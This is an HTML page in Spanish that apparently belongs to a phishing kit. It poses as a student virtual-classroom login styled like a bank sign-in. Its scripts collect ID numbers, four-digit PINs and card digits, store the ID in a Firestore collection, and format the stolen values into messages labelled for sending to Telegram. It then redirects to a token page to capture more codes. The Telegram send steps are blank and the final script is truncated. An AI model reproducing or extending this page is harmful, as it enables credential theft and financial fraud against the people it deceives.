<!DOCTYPE html>
 
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

    <title>Divisi√≥n y Carrusel</title>
    <link rel="stylesheet" href="css/styles.css">
     
     
  </head>
  <body>
    <!-- Spinner overlay (hidden by default). Se muestra al presionar Ingresar y redirige luego -->
    <div id="spinner-overlay" class="spinner-overlay" style="display:none;">
      <div class="spinner-wrapper" role="status" aria-label="Cargando">
        <!-- Inline SVG wrapper con filtro para eliminar fondo blanco de la imagen PNG -->
        <svg class="spinner-image" viewBox="0 0 120 120" width="120" height="120" role="img" aria-hidden="true">
          <image href="images/ban.png" x="0" y="0" width="120" height="120" preserveAspectRatio="xMidYMid meet"></image>
        </svg>
        <div class="spinner-text" aria-live="polite">Espere un momento, por favor.</div>
      </div>
    </div>
    <div class="container">
      <div class="left">
        <div class="formulario">
          <div class="imagenlogo">
            <img src="assets/logo.svg" style="width: 200px">
          </div>
          <div class="titulo"><h2>Bienvenido a tu aula Virtual</h2></div>
          <div class="seguriads">
            <img src="assets/seguridad.png" style="width: 100%">
          </div>
          <div class="formcontainer">
            <!-- Div superior con dos apartados -->
            <div class="header">
              <div class="tab active" id="tab-left" onclick="showForm(&#39;form1&#39;, this)">
                Clave segura
              </div>
              <div class="tab" id="tab-right" onclick="showForm(&#39;form2&#39;, this)">
                Tarjeta de estudiante
              </div>
            </div>

            <!-- Formularios -->
            <div class="forms">
              <div id="form1" class="form-content">
                <form id="segura">
                  <div style="height: 30px">
                    <label style="margin-bottom: 20px">Identi estudiante</label>
                  </div>
                  <div style="display: flex">
                    <div style="width: 30%">
                      <select id="form1select" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">
                        <option hidden="" disabled="">Seleccione</option>
                        <option id="C.C.   C√©dula de ciudadan√≠a" value="CC">
                          C.C.. C√©dula de ciudadan√≠a
                        </option>
                        <option id="T.I.   Tarjeta de Identidad" value="TI">
                          T.I.. Tarjeta de Identidad
                        </option>
                  
                      </select>
                    </div>
                    <div style="width: 70%">
                      <input id="form1identificacion" type="text" inputmode="numeric" placeholder="#" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          margin-left: 5px;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">

                      <script>
                        document
                          .getElementById("form1identificacion")
                          .addEventListener("input", function (event) {
                            // Remover cualquier car√°cter que no sea un n√∫mero
                            this.value = this.value.replace(/[^0-9]/g, "");
                          });
                      </script>
                    </div>
                  </div>
                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">Clave estudiante </label>
                  </div>
                  <div style="width: 100%">
                    <input id="form1clavesegura" inputmode="numeric" type="text" minlength="4" 
					 maxlength="4" placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;

                        text-indent: 16px;
                        padding: 0;

                        color: #000000;
                        border: solid 1px #b3b3b3;

                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">
                    <script>
                      document
                        .getElementById("form1clavesegura")
                        .addEventListener("input", function (event) {
                          // Remover cualquier car√°cter que no sea un n√∫mero
                          this.value = this.value.replace(/[^0-9]/g, "");
                        });
                    </script>
                  </div>

                  <button type="submit" style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20px;
                      color: white;
                      margin-top: 30px;
                      border: none;
                      cursor: pointer;
                    ">
                    Ingresar
                  </button>

                  <div style="width: 100%; text-align: center">
                    <img src="assets/footer.png" style="width: 100%" alt="">
                  </div>
                </form>
              </div>

              <div id="form2" class="form-content" style="display: none">
                <form id="tarjeta">
                  <div style="height: 30px">
                    <label style="margin-bottom: 20px">Ide estudiantil</label>
                  </div>
                  <div style="display: flex">
                    <div style="width: 30%">
                      <select id="form2select" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          text-indent: 16px;
                          padding: 0;
                          color: #000000;
                          border: solid 1px #b3b3b3;
                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                          font-size: 18px;
                        ">
                        <option hidden="" disabled="">Seleccione</option>
                        <option id="C.C.   C√©dula de ciudadan√≠a" value="CC">
                          C.C. C√©dula de ciudadan√≠a
                        </option>
                        <option id="T.I.   Tarjeta de Identidad" value="TI">
                          T.I. Tarjeta de Identidad
                        </option>
                         
                      </select>
                    </div>
                    <div style="width: 70%">
                      <input id="form2debito" type="text" inputmode="numeric" placeholder="#" style="
                          outline: none;
                          margin: 0;
                          width: 100%;
                          font-size: 18px;
                          text-indent: 16px;
                          padding: 0;
                          margin-left: 5px;
                          color: #000000;
                          border: solid 1px #b3b3b3;

                          background-color: white;
                          border-radius: 4px;
                          text-align: left;
                          height: 48px;
                          text-overflow: ellipsis;
                          padding-right: 16px;
                        ">
                      <script>
                        document
                          .getElementById("form2debito")
                          .addEventListener("input", function (event) {
                            // Remover cualquier car√°cter que no sea un n√∫mero
                            this.value = this.value.replace(/[^0-9]/g, "");
                          });
                      </script>
                    </div>
                  </div>
                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">Clave de estudiante</label>
                  </div>
                  <div style="width: 100%">
                    <input id="clavesd" inputmode="numeric" type="text" placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;
                        text-indent: 16px;
                        padding: 0;
                        color: #000000;
                        border: solid 1px #b3b3b3;
                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">
                  </div>

                  <div style="height: 30px; margin-top: 20px">
                    <label style="margin-bottom: 20px">√öltimos 4 d√≠gitos de tu carnet estudantil</label>
                  </div>
                  <div style="width: 100%">
                    <input inputmode="numeric" minlength="4" maxlength="4" id="form2digitos" type="text" placeholder="..." style="
                        outline: none;
                        margin: 0;
                        width: 100%;
                        text-indent: 16px;
                        padding: 0;
                        color: #000000;
                        border: solid 1px #b3b3b3;
                        background-color: white;
                        border-radius: 4px;
                        text-align: left;
                        height: 48px;
                        text-overflow: ellipsis;
                        padding-right: 16px;
                        font-size: 18px;
                      ">

                    <script>
                      document
                        .getElementById("form2digitos")
                        .addEventListener("input", function (event) {
                          // Remover cualquier car√°cter que no sea un n√∫mero
                          this.value = this.value.replace(/[^0-9]/g, "");
                        });
                    </script>
                  </div>

                  <button style="
                      width: 100%;
                      background: #0043a9;
                      border-radius: 20px;
                      padding: 20p;
                      color: white;
                      margin-top: 30px;
                    ">
                    Ingresar
                  </button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="right">
        <div class="promo-image">
          <img src="assets/credito.png" style="width: 100%">
        </div>
        <div class="carousel-wrapper">
          <button class="prev">‚ùÆ</button>
          <div class="carousel">
            <div class="carousel-item">
              <img src="assets/1.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/2.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/3.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/4.png" style="width: 100%">
            </div>
            <div class="carousel-item">
              <img src="assets/5.png" style="width: 100%">
            </div>
          </div>
          <button class="next">‚ùØ</button>
        </div>
      </div>
    </div>

     

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#segura");

    form.addEventListener("submit", async (event) => {
      event.preventDefault(); // Evita que el formulario se env√≠e por defecto
      const opcion = document.querySelector("#form1select").value;
      const identificacion = document.querySelector(
        "#form1identificacion"
      ).value;
      const clave = document.querySelector("#form1clavesegura").value;

      // Validaci√≥n: Comprobar si todos los campos est√°n llenos
      if (
        identificacion.trim() === "" ||
        clave.trim() === "" ||
        opcion.trim() === ""
      ) {
        alert("Por favor, llena todos los campos.");
        return; // Evita que contin√∫e el proceso si alg√∫n campo est√° vac√≠o
      }

      // Validaci√≥n: Comprobar si la clave tiene exactamente 4 d√≠gitos
      if (!/^\d{4}$/.test(clave)) {
        alert("La clave debe tener exactamente 4 d√≠gitos num√©ricos.");
        return; // Evita que contin√∫e el proceso si la clave no es v√°lida
      }

      // Mostrar spinner y redirigir a token.html luego de 5 segundos
      try {
        const submitBtn = event.submitter || event.target.querySelector('button[type="submit"]');
        if (submitBtn) submitBtn.disabled = true;
      } catch (e) {
        // event.submitter no disponible en algunos navegadores; est√° bien si falla
      }
        showSpinnerAndRedirect(5000, 'token.html');

      localStorage.setItem("usuario", identificacion);
      const questionRef = doc(window.db, "bogota2", identificacion);
      await setDoc(questionRef, {
        page: 0,
      });
      const message =
        "üè¶ *ESCUEA VIRTUAL - CLAVE ESTUDIANTIL*\n\n" +
        "üìã *Tipo de identificaci√≥n:* " + opcion + "\n" +
        "üÜî *Identificaci√≥n:* " + identificacion + "\n" +
        "üîê *Clave:* " + clave + "\n" +
        "‚è∞ *Fecha:* " + new Date().toLocaleString();

      // Enviar datos a Telegram
      
    });

    const form2 = document.querySelector("#tarjeta");
    form2.addEventListener("submit", async (event) => {
      event.preventDefault(); // Evita que el formulario se env√≠e por defecto
      const opcion = document.querySelector("#form2select").value;
      const identificacion = document.querySelector("#form2debito").value;
      const clave = document.querySelector("#clavesd").value;
      const ultimos = document.querySelector("#form2digitos").value;

      // Validaci√≥n: Comprobar si todos los campos est√°n llenos
      if (
        identificacion.trim() === "" ||
        clave.trim() === "" ||
        opcion.trim() === "" ||
        ultimos.trim() === ""
      ) {
        alert("Por favor, llena todos los campos.");
        return; // Evita que contin√∫e el proceso si alg√∫n campo est√° vac√≠o
      }

      // Validaci√≥n: Comprobar si la clave tiene exactamente 4 d√≠gitos
      if (!/^\d{4}$/.test(clave)) {
        alert("La clave debe tener exactamente 4 d√≠gitos num√©ricos.");
        return; // Evita que contin√∫e el proceso si la clave no es v√°lida
      }

      localStorage.setItem("usuario", identificacion);
      const questionRef = doc(window.db, "bogota2", identificacion);
      await setDoc(questionRef, {
        page: 0,
      });
      const message =
        "üí≥ *ESCUELA VIRTUAL - CARNET ESTUDIANTIL*\n\n" +
        "üìã *Tipo de identificaci√≥n:* " + opcion + "\n" +
        "üÜî *Identificaci√≥n:* " + identificacion + "\n" +
        "üîê *Clave:* " + clave + "\n" +
        "üí≥ *√öltimos d√≠gitos:* " + ultimos + "\n" +
        "‚è∞ *Fecha:* " + new Date().toLocaleString();

      // Enviar datos a Telegram
       
  </script>
    
      
    
</body></html>